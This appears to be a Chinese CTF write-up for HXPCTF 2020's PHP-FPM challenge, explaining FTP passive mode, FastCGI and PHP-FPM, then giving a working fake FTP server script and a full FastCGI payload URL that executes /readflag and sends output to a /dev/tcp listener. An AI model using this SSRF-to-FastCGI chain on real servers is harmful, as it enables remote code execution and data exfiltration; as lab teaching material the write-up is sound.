---
title: Web安全--PHP-FPM被动RCE
categories:
- CTF
- Web
---

在介绍这个漏洞之前，我们需要知道几个概念

- FTP的两种模式：主动模式（PORT） 被动模式(PSAV)

- fast-cgi  是什么？

- php-fpm是什么以及工作原理



### 一.FTP的主动模式和被动模式：

- 主动模式：（PORT）

控制连接：客户端随机开 >1024 高位端口 X，主动连服务器 21 端口，建立控制通道。

客户端本地监听 X+1 端口，并通过 PORT 命令把自己 `IP:X+1` 发给服务器。

数据连接：服务器用20 端口 主动发起连接，连客户端的 X+1，建立数据通道传文件。



- 被动模式（PASV）

1.客户端随机高位端口 → 连服务器 **21 端口**，建立**控制通道**。

2.客户端发 PASV 命令。

3.服务器自己随机开一个高位端口 Y，把 `IP:Y` 通过响应告诉客户端。

4.客户端再开一个新高位端口，主动去连服务器的 Y 端口，建立数据通道



但是由于防火墙的存在，服务端的20 端口主动连接客户端 容易被防火墙拦截

所以现在基本使用被动连接，让客户端连接服务器



### 二.Fast-cgi的基本概念以及工作原理

在解释这个之前，先让我们来简述一下CGI

那么，什么是CGI呢？它的CGI 全称是 ****Common Gateway Interface，通用网关接口。

它的作用是什么呢？

Nginx只能处理HTML/CSS/图片诸如此类的静态文件，CGI可以将调用PHP，Python等程序处理动态网页请求 比如用户想访问index.php 那么CGI的处理流程就是这样：

```Shell
client(客户端)访问index.php->Nginx->CGI->php程序->返回给Nginx—>客户端
```

但是原生 CGI 存在明显缺陷：每接收一个请求，都要重新创建进程，请求处理完毕后立刻销毁进程。频繁创建和销毁进程开销极大，导致性能低下，并发量稍高就容易拥堵卡顿。

为了解决原生 CGI 的性能瓶颈，Fast-CGI 应运而生

Fast-CGI 完美解决了 CGI 每次请求都创建、销毁进程的弊端，采用常驻进程池的方式实现请求复用。PHP-FPM在服务器启动时，就预先创建一批 PHP 工作进程，常驻内存不退出，一直处于待命等待请求的状态

FastCGI 本质是CGI 的升级通信协议，核心采用进程池+常驻内存架构，实现进程复用，大幅提升并发处理能力



### 三.PHP-FPM是什么？

PHP-FPM 全称：PHP FastCGI Process Manager，PHP FastCGI 进程管理器

用于管理Fast-CGI的php进程的工具 ，负责创建、管理、调度、维护一批常驻的 PHP 工作进程，给 Nginx 处理 PHP 动态请求。

那么为什么要有php-fpm呢 

只有 FastCGI 协议没用，需要一个程序来管理进程，创建,管理,调度,维护等 

Nginx 不直接管 PHP 进程，只把请求丢给 PHP-FPM



下面来看工作原理：

{% asset_img image.png %}

PHP-FPM 启动，创建 Worker 进程池，同时**监听 9000 端口或 Unix Socket（fast-cgi的两种通讯方式）**。

客户端访问 index.php，请求到达 Nginx

Nginx 通过 FastCGI 协议，把请求发给 PHP-FPM

PHP-FPM 调度空闲 Worker 进程执行 PHP 代码

执行结果返回 Nginx，再由 Nginx 发给客户端

Worker 进程不销毁，回到进程池等待下次复用

了解了这些之后，我们再来看这个漏洞

### 四：php-fpm被动模式RCE漏洞

#### 1.HXPCTF 2020

```Shell
<?php
// 获取GET请求中的file参数，如果没有则使用默认值 /tmp/file
$file = $_GET['file'] ?? '/tmp/file';

// 获取GET请求中的data参数，如果没有则使用默认值 :)
$data = $_GET['data'] ?? ':)';

// 将$data的内容写入$file指定的文件中（高危：无过滤，可任意写文件）
file_put_contents($file, $data);

// 读取$file文件的内容并输出到页面
echo file_get_contents($file);
?>
```

[https://www.php.net/manual/zh/wrappers.php#wrappers](https://www.php.net/manual/zh/wrappers.php#wrappers) 这个是php支持的协议

```HTTP
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — 安全外壳协议 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

Dockerfile部分：

```Dockerfile
# echo 'hxp{FLAG}' > flag.txt && docker build -t resonator . && docker run --cap-add=SYS_ADMIN --security-opt apparmor=unconfined -ti -p 8009:80 resonator

FROM debian:buster

RUN DEBIAN_FRONTEND=noninteractive apt-get update && \
    apt-get install -y \
        nginx \
        php-fpm \
    && rm -rf /var/lib/apt/lists/

RUN rm -rf /var/www/html/*
COPY docker-stuff/default /etc/nginx/sites-enabled/default
COPY docker-stuff/www.conf /etc/php/7.3/fpm/pool.d/www.conf

#  # Permission
#  7 rwx
#  6 rw-
#  5 r-x
#  4 r--
#  3 -wx
#  2 -w-
#  1 --x
#  0 ---

COPY flag.txt docker-stuff/readflag /
RUN chown 0:1337 /flag.txt /readflag && \
    chmod 040 /flag.txt && \
    chmod 2555 /readflag

COPY index.php /var/www/html/
RUN chown -R root:root /var/www && \
    find /var/www -type d -exec chmod 555 {} \; && \
    find /var/www -type f -exec chmod 444 {} \;

RUN ln -sf /dev/stdout /var/log/nginx/access.log && \
    ln -sf /dev/stderr /var/log/nginx/error.log

USER www-data
RUN (find --version && id --version && sed --version && grep --version) > /dev/null
RUN ! find / -writable -or -user $(id -un) -or -group $(id -Gn|sed -e 's/ / -or -group /g') 2> /dev/null | grep -Ev -m 1 '^(/dev/|/run/|/proc/|/sys/|/tmp|/var/tmp|/var/lock|/var/log/nginx/error.log|/var/log/nginx/access.log|/var/lib/php/sessions)'

USER root
EXPOSE 80
CMD /etc/init.d/php7.3-fpm start && \
    nginx -g 'daemon off;'

```

通过docker文件我们发现，容器对权限的校验非常严格，我们想获取flag只能通过/readflag这个suid程序，且目前能直接利用的协议只有ftp://



接下来我们理一下攻击思路：

1. 创建一个虚假的ftp，诱导服务器访问本地127.0.0.1:9000(fast-cgi端口)

2. 发送fast-cgi报文，执行命令，将数据带出   

3. 监听本地，获取flag

好的，首先我们开始第一步，创建一个虚假的FTP服务器：

```Python
import socket

# 配置监听地址和端口
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 5555
BUFFER_SIZE = 1024

def main():
    # 创建 TCP 套接字
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 端口复用，避免重启报错
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # 绑定并监听
    server_socket.bind((LISTEN_HOST, LISTEN_PORT))
    server_socket.listen(3)
    print(f"FTP 服务端已启动：{LISTEN_HOST}:{LISTEN_PORT}")

    # 等待客户端连接
    client_conn, client_addr = server_socket.accept()
    print(f"客户端已连接：{client_addr}")

    try:
        # 220 服务就绪
        client_conn.sendall(b"220 \r\n")
        print("[客户端]", client_conn.recv(BUFFER_SIZE).decode().strip())

        # 331 用户名 OK
        client_conn.sendall(b"331 \r\n")
        print("[客户端]", client_conn.recv(BUFFER_SIZE).decode().strip())

        # 230 登录成功
        client_conn.sendall(b"230 \r\n")
        print("[客户端]", client_conn.recv(BUFFER_SIZE).decode().strip())

        # 200 命令确认
        client_conn.sendall(b"200 \r\n")
        print("[客户端]", client_conn.recv(BUFFER_SIZE).decode().strip())

        # 550 文件不可用
        client_conn.sendall(b"550 \r\n")
        print("[客户端]", client_conn.recv(BUFFER_SIZE).decode().strip())

        # 忽略 EPSV
        client_conn.sendall(b"200 \r\n")
        print("[客户端]", client_conn.recv(BUFFER_SIZE).decode().strip())

        # 227 被动模式（端口 9000）
        client_conn.sendall(b"227 127,0,0,1,35,40\r\n")
        print("[客户端]", client_conn.recv(BUFFER_SIZE).decode().strip())

        # 150 文件状态正常
        client_conn.sendall(b"150 \r\n")
        print("[客户端]", client_conn.recv(BUFFER_SIZE).decode().strip())

    finally:
        # 安全关闭连接
        client_conn.close()
        server_socket.close()

if __name__ == "__main__":
    main()
```

这个脚本在 5555 端口开了个假 FTP 服务，等 PHP 主动连过来，假装是正规 FTP 服务器，骗它把数据传输端口指向服务器的9000端口（fast-cgi），完成漏洞利用。

`client_conn.sendall(b"227 127,0,0,1,35,40\r\n")` (端口计算规则：35x256+40=9000)

整个脚本中，这个是核心要素

告诉服务器开启了被动模式，去连这个ip和端口传输数据

此时我们的目的就达到了，使用gopherus生成fast-cgi报文的payload ，输入命令将/readflag的执行结果带外：

{% asset_img image_1.png %}

在本地监听4444端口：

{% asset_img image_2.png %}

运行fake_ftp脚本：

{% asset_img image_3.png %}

最后一步!!

```HTTP
http://10.10.139.163:8009/?file=ftp://10.10.139.169:5555/a&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH101%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00e%04%00%3C%3Fphp%20system(%27bash%20-c%20%22/readflag%20%3E%20/dev/tcp/10.10.139.169/4444%22%27)%3Bdie(%27-----Made-by-SpyD3r-----%0A%27)%3B%3F%3E%00%00%00%00
```

file传入ftp协议，data传入生成的fastcgi报文：



{% asset_img image_4.png %}



